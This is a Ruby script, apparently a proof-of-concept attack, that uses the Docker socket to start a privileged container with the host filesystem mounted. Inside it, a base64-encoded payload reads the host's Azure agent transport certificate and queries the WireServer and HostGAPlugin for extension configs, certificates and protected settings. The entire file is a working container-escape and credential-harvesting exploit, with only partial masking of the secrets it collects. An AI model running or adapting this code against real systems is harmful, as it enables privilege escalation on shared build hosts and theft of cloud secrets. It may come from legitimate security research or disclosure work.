require 'socket'
require 'json'

puts "VX_EXEC_UID=#{`id -u`.strip}"

def dapi(method, path, body = nil)
  s = UNIXSocket.new('/var/run/docker.sock')
  b = body ? JSON.generate(body) : ''
  s.write("#{method} #{path} HTTP/1.1\r\nHost: docker\r\nConnection: close\r\nContent-Type: application/json\r\nContent-Length: #{b.bytesize}\r\n\r\n#{b}")
  buf = +''
  begin
    loop { buf << s.readpartial(8192) }
  rescue EOFError, IOError
  end
  s.close
  hdr, _, pl = buf.partition("\r\n\r\n")
  if hdr =~ /chunked/i
    out = +''; i = 0
    while i < pl.bytesize
      j = pl.index("\r\n", i); break unless j
      n = pl[i...j].to_i(16); break if n.zero?
      out << pl[j + 2, n]; i = j + 2 + n + 2
    end
    pl = out
  end
  [hdr[/\d{3}/].to_i, pl]
rescue => e
  [-1, "ERR #{e.class}: #{e.message[0, 120]}"]
end

inner = <<'RUBY'
require 'net/http'
require 'json'
require 'digest'
require 'base64'

HOST = '/host'

def mask_blobs(s)
  s.gsub(/[A-Za-z0-9+\/=\r\n]{400,}/) do |m|
    t = m.gsub(/\s/, '')
    "#{t[0, 60]}...(b64len=#{t.length})"
  end
end

def mask_secrets(s)
  s.gsub(/("[^"]*(?:token|privatekey|secret|password|accesskey|signature)[^"]*"\s*:\s*")([^"]*)(")/i) do
    "#{$1}#{$2[0, 8]}...(len=#{$2.length})#{$3}"
  end
end

der = `openssl x509 -in #{HOST}/var/lib/waagent/TransportCert.pem -outform DER 2>/dev/null`
CERT_B64 = der.empty? ? nil : Base64.strict_encode64(der)
XV = { 'x-ms-version' => '2015-04-05' }
CERTH = CERT_B64 ? { 'x-ms-guest-agent-public-x509-cert' => CERT_B64 } : {}
puts "VX_CERT der_len=#{der.bytesize}"

def http_get(host, port, path, headers = {})
  h = Net::HTTP.new(host, port)
  h.open_timeout = 4
  h.read_timeout = 8
  req = Net::HTTP::Get.new(path)
  headers.each { |k, v| req[k] = v }
  r = h.request(req)
  [r.code.to_s, r.body.to_s]
rescue => e
  ["ERR", "#{e.class}: #{e.message[0, 100]}"]
end

# ---- goalstate with x-ms-version ----
gc, gs = http_get('168.63.129.16', 80, '/machine/?comp=goalstate', XV.merge(CERTH))
puts "VX_WS goalstate -> #{gc} len=#{gs.bytesize} #{mask_blobs(gs)[0, 400].inspect}"
cid = gs[/<ContainerId>([^<]+)/, 1]
inc = gs[/<Incarnation>([^<]+)/, 1]
puts "VX_WS_PARSE container=#{cid} incarnation=#{inc}"

# ---- (1) extensionsConfig — the priority target ----
if cid && inc
  c, b = http_get('168.63.129.16', 80, "/machine/#{cid}/#{inc}?comp=extensionsConfig", XV.merge(CERTH))
  puts "VX_WS extensionsConfig -> #{c} len=#{b.bytesize}"
  puts "VX_EC_TAGS #{b.scan(/<([A-Za-z_]+)/).flatten.tally.sort_by { |_, v| -v }.first(40).inspect}"
  puts "VX_EC_PROTECTED_PRESENT=#{b =~ /protectedSettings/i ? 'YES' : 'no'}"
  puts "VX_EC_BODY #{mask_blobs(mask_secrets(b))[0, 4200].inspect}"
  c, b = http_get('168.63.129.16', 80, "/machine/#{cid}/#{inc}?comp=certificates", XV.merge(CERTH))
  puts "VX_WS certificates -> #{c} len=#{b.bytesize} #{mask_blobs(b)[0, 800].inspect}"
  c, b = http_get('168.63.129.16', 80, "/machine/#{cid}/#{inc}?comp=hostingEnvironmentConfig", XV.merge(CERTH))
  puts "VX_WS hostingEnvConfig -> #{c} len=#{b.bytesize} #{mask_blobs(b)[0, 800].inspect}"
else
  puts 'VX_WS_SKIP no container/incarnation'
end

# ---- (2) hostplugin /vmSettings FULL body ----
c, b = http_get('168.63.129.16', 32526, '/vmSettings')
puts "VX_HP vmSettings -> #{c} len=#{b.bytesize}"
begin
  j = JSON.parse(b)
  puts "VX_VMSET_TOPKEYS #{j.keys.inspect}"
  lines = []
  walk = lambda do |o, path|
    case o
    when Hash
      o.each do |k, v|
        if k =~ /settings|protected|certificat/i
          if v.is_a?(Hash)
            lines << "#{path}/#{k} keys=#{v.keys.inspect[0, 200]}"
          elsif v.is_a?(Array)
            lines << "#{path}/#{k} array[#{v.length}]"
          else
            lines << "#{path}/#{k} #{v.class} len=#{v.to_s.length}"
          end
        end
        walk.call(v, "#{path}/#{k}") if v.is_a?(Hash) || v.is_a?(Array)
      end
    when Array
      o.each_with_index { |v, i| walk.call(v, "#{path}[#{i}]") }
    end
  end
  walk.call(j, '')
  lines.first(60).each { |l| puts "VX_SET #{l}" }
  puts "VX_SET_COUNT #{lines.length}"
rescue => e
  puts "VX_VMSET_PARSE_ERR #{e.message[0, 100]}"
end
puts "VX_VMSET_BODY #{mask_blobs(mask_secrets(b))[0, 2600].inspect}"

puts 'VX_INNER_DONE'
RUBY

inner_b64 = [inner].pack('m0')
cmd = "echo #{inner_b64} | base64 -d > /tmp/i.rb && ruby /tmp/i.rb 2>&1"

create_body = {
  Image: 'ghcr.io/actions/jekyll-build-pages:v1.0.13',
  Tty: true,
  Entrypoint: ['bash', '-c'],
  Cmd: [cmd],
  HostConfig: {
    Binds: ['/:/host'],
    PidMode: 'host',
    NetworkMode: 'host',
    Privileged: true
  }
}

code, body = dapi('POST', '/containers/create', create_body)
puts "VX_CREATE code=#{code} #{body[0, 300]}"
cid = (JSON.parse(body)['Id'] rescue nil)
if cid
  c2, b2 = dapi('POST', "/containers/#{cid}/start")
  puts "VX_START code=#{c2} #{b2[0, 200]}"
  c3, b3 = dapi('POST', "/containers/#{cid}/wait")
  puts "VX_WAIT code=#{c3} #{b3[0, 200]}"
  c4, logs = dapi('GET', "/containers/#{cid}/logs?stdout=1&stderr=1")
  puts "VX_LOGS code=#{c4}"
  scrub = logs.gsub(/[^[:print:]\n]/, '')
  puts 'VX_ESC_BEGIN'
  puts scrub[0, 14000]
  puts 'VX_ESC_END'
  c5, b5 = dapi('DELETE', "/containers/#{cid}?force=true")
  puts "VX_DEL code=#{c5}"
else
  puts 'VX_NO_CONTAINER'
end
